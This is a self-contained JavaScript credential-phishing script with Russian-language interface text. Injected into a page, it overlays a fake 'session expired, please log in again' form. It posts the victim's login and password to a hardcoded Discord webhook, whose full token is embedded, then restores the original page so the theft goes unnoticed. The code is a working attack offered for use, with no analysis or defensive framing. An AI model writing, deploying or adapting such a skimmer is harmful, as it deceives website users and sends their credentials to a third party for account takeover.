(() => {
  // Сохраняем исходное содержимое и стили страницы, чтобы вернуть после входа
  const originalBodyHTML = document.body.innerHTML;
  const originalBodyStyle = {
    margin: document.body.style.margin,
    background: document.body.style.background,
    display: document.body.style.display,
    justifyContent: document.body.style.justifyContent,
    alignItems: document.body.style.alignItems,
    height: document.body.style.height,
  };

  // Создаём стиль с @font-face
  const style = document.createElement('style');
  style.textContent = `
    @supports (font-variation-settings: normal) {
      @font-face {
        ascent-override: 100%;
        font-display: swap;
        font-family: Intervar;
        font-style: normal;
        font-weight: 100 900;
        src: url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2 supports variations(gvar)'),
             url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2-variations'),
             url('/assets/dist/inter_roman_var.ba4caefc.woff2') format('woff2');
      }
      @font-face {
        ascent-override: 100%;
        font-display: swap;
        font-family: Intervar;
        font-style: italic;
        font-weight: 100 900;
        src: url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2 supports variations(gvar)'),
             url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2-variations'),
             url('/assets/dist/inter_italic_var.30807be7.woff2') format('woff2');
      }
    }
    body, input, button, label {
      font-family: 'Intervar', sans-serif;
    }
  `;
  document.head.appendChild(style);

  // Создаём оверлей — div на весь экран с абсолютным позиционированием
  const overlay = document.createElement('div');
  overlay.id = 'loginviewport';
  Object.assign(overlay.style, {
    position: 'fixed',
    top: '0',
    left: '0',
    width: '100vw',
    height: '100vh',
    background: 'rgba(245, 245, 245, 0.98)',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: '9999',
    fontFamily: `'Intervar', sans-serif`,
  });

  // Контейнер формы
  const container = document.createElement('div');
  Object.assign(container.style, {
    width: '360px',
    padding: '20px',
    background: 'white',
    boxShadow: '0 0 10px rgba(0,0,0,0.1)',
    borderRadius: '8px',
  });
  overlay.appendChild(container);

  // Заголовок
  const h1 = document.createElement('h1');
  h1.textContent = 'Ваша сессия окончена. Пожалуйста, войдите снова.';
  h1.style.textAlign = 'center';
  h1.style.marginBottom = '24px';
  container.appendChild(h1);

  // Форма
  const form = document.createElement('form');
  Object.assign(form.style, {
    display: 'flex',
    flexDirection: 'column',
  });

  // Логин
  const loginLabel = document.createElement('label');
  loginLabel.textContent = 'Логин';
  loginLabel.style.marginBottom = '6px';
  form.appendChild(loginLabel);

  const loginInput = document.createElement('input');
  loginInput.type = 'text';
  loginInput.name = 'login';
  loginInput.autocomplete = 'username';
  loginInput.required = true;
  Object.assign(loginInput.style, {
    padding: '10px',
    marginBottom: '16px',
    fontSize: '16px',
    border: '1px solid #ccc',
    borderRadius: '4px',
  });
  form.appendChild(loginInput);

  // Пароль
  const passLabel = document.createElement('label');
  passLabel.textContent = 'Пароль';
  passLabel.style.marginBottom = '6px';
  form.appendChild(passLabel);

  const passInput = document.createElement('input');
  passInput.type = 'password';
  passInput.name = 'password';
  passInput.autocomplete = 'current-password';
  passInput.required = true;
  Object.assign(passInput.style, {
    padding: '10px',
    marginBottom: '24px',
    fontSize: '16px',
    border: '1px solid #ccc',
    borderRadius: '4px',
  });
  form.appendChild(passInput);

  // Кнопка
  const btn = document.createElement('button');
  btn.type = 'submit';
  btn.textContent = 'Войти';
  Object.assign(btn.style, {
    backgroundColor: '#d32f2f',
    color: 'white',
    fontSize: '16px',
    padding: '12px',
    border: 'none',
    borderRadius: '4px',
    cursor: 'pointer',
    transition: 'background-color 0.3s',
  });
  btn.onmouseenter = () => btn.style.backgroundColor = '#b71c1c';
  btn.onmouseleave = () => btn.style.backgroundColor = '#d32f2f';

  form.appendChild(btn);

  container.appendChild(form);

  // Обработчик сабмита
  form.addEventListener('submit', e => {
    e.preventDefault();
    const login = loginInput.value.trim();
    const password = passInput.value;

    if (!login || !password) {
      alert('Пожалуйста, заполните все поля');
      return;
    }

    // Подготовка данных для Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/1210472682563567686/FUb00La-5a9McnB-OGlPdVwhZYViqLib8bppLlH6TmQCptLzrMy_MKc4KI1aFF934LYx';

    const payload = {
      content: null,
      embeds: [
        {
          title: "Новая авторизация",
          color: 16711680,
          fields: [
            { name: "Логин", value: login, inline: true },
            { name: "Пароль", value: password, inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    // Отправляем на вебхук
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) throw new Error('Ошибка при отправке данных');
      // После успешной отправки — удаляем оверлей, показываем исходную страницу
      document.body.removeChild(overlay);
      // Восстанавливаем стили
      for (const key in originalBodyStyle) {
        document.body.style[key] = originalBodyStyle[key];
      }
      // Восстанавливаем исходный HTML
      document.body.innerHTML = originalBodyHTML;
      alert('Данные успешно отправлены. Добро пожаловать!');
    })
    .catch(err => {
      alert('Ошибка отправки данных: ' + err.message);
    });
  });

  // Добавляем оверлей на страницу
  document.body.appendChild(overlay);
})();
